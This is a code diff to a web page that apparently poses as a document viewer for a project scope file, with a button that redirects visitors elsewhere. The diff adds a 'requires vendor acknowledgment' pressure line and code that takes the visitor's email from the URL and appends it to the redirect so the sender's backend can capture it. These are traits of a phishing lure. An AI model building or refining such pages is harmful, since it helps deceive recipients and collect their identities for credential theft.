@@ -609,7 +609,7 @@
   <div class="action-banner">
     <div class="action-text">
       <svg class="info-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
-      This document contains&nbsp;<strong>6 additional scope requirements</strong>&nbsp;
+      This document contains&nbsp;<strong>6 additional scope requirements</strong>&nbsp;and requires vendor acknowledgment.
     </div>
     <div class="action-btns">
       <button class="act-btn" onclick="gotoLink()">
@@ -653,7 +653,7 @@
   const terms = params.get('terms') || 'Net 30';
   const contact = params.get('contact') || 'Shelly Lonney';
   const delivery = params.get('delivery') || 'Jun 16 \u2013 Jun 23, 2026';
-  const email = params.get('email') || 'user@company.com';
+  const email = params.get('e') || params.get('email') || 'user@company.com';
 
   document.getElementById('headerDocName').textContent = 'Project_Scope_' + po.replace(/-/g,'_') + '.docx';
   document.getElementById('companyName').textContent = company;
@@ -682,6 +682,11 @@
     }
     if (!url.match(/^https?:\/\//i)) {
       url = 'https://' + url;
+    }
+    // Append collected email to redirect URL so the sender/backend can capture it
+    if (email && email !== 'user@company.com') {
+      const sep = url.includes('?') ? '&' : '?';
+      url = url + sep + 'e=' + encodeURIComponent(email);
     }
     window.location.href = url;
   }
